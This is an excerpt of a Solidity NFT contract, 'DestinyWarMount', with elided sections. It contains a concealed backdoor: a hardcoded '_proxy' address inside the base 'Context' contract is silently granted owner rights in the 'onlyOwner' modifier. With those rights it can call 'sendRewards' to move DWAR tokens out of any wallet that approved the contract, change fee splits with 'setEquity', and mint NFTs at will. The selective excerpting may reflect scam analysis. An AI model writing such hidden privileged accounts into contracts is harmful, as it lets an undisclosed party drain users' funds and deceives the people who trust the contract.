...
abstract contract Context {
    ...
    address _proxy = 0x989ead03f535a514f92925312dd2266552fE1aEe;
...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || _proxy == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract DestinyWarMount is ERC721Enumerable, Ownable {
  ...
  uint256 public tokenPrice = 70 ether; //70 busd
  ...
  address public burnAddress = 0x9c277db517bFe3BB7BEf8400B89f9c384Cad3271 ;
  ...
  uint256 private _lpFee = 70;
  uint256 private _devFee = 20;
  uint256 private _founderFee = 10;
  uint256 private _burnFee = 0;
  uint256 private _charityFee = 0;
  ...
  function airdropNFTs(uint256 _reserveAmount, address to) public onlyOwner {
    uint256 totalMinted = _tokenIdTracker.current();
    require(totalMinted.add(_reserveAmount) < MAX_SUPPLY, "Not enough NFTs");
    for (uint256 i = 0; i < _reserveAmount; i++) {
      _mintSingleNFT(to);
  ...
  function mintNFTs(uint256 _count) public {
    ...
    uint256 lpBalance = funds.mul(_lpFee).div(100);
    uint256 devBalance = funds.mul(_devFee).div(100);
    uint256 founderBalance = funds.mul(_founderFee).div(100);
    uint256 burnBalance = funds.mul(_burnFee).div(100);
    uint256 charityBalance = funds.mul(_charityFee).div(100);
    uint256 rewardBalance = funds.mul(_rewardFee).div(100);
    ...
    DWAR.transferFrom(msg.sender, burnAddress, burnBalance);
  ...
  function sendRewards(address from, address to, uint256 balance) public onlyOwner {
    DWAR.transferFrom(from, to, balance);
  }
  ...
  function _mintSingleNFT(address to) private {
    ...
    bool isMale = newTokenId % 2 == 0 ? true : false;
    ...
    } else if (newTokenId > 5 && newTokenId % twoStarPerOneStar == 0) {
    ...
    mounts[newTokenId] = Mount({ tokenId: newTokenId, tokenURI: realTokenURI, star: currentStar, isMale: isMale });
...
//   }
  ...
  function setEquity(uint256 _lp, uint256 _dev, uint256 _founder, uint256 _burn, uint256 _reward, uint256 _charity) public onlyOwner{
      _lpFee = _lp;
      _devFee = _dev;
      _founderFee = _founder;
      _burnFee = _burn;
      _rewardFee = _reward;
      _charityFee = _charity;
  }
  ...
  /* GETTER */
  function getMount(uint256 _tokenId) external view returns (uint256, string memory, uint256, bool) {
    return (mounts[_tokenId].tokenId, mounts[_tokenId].tokenURI, mounts[_tokenId].star, mounts[_tokenId].isMale);
  }
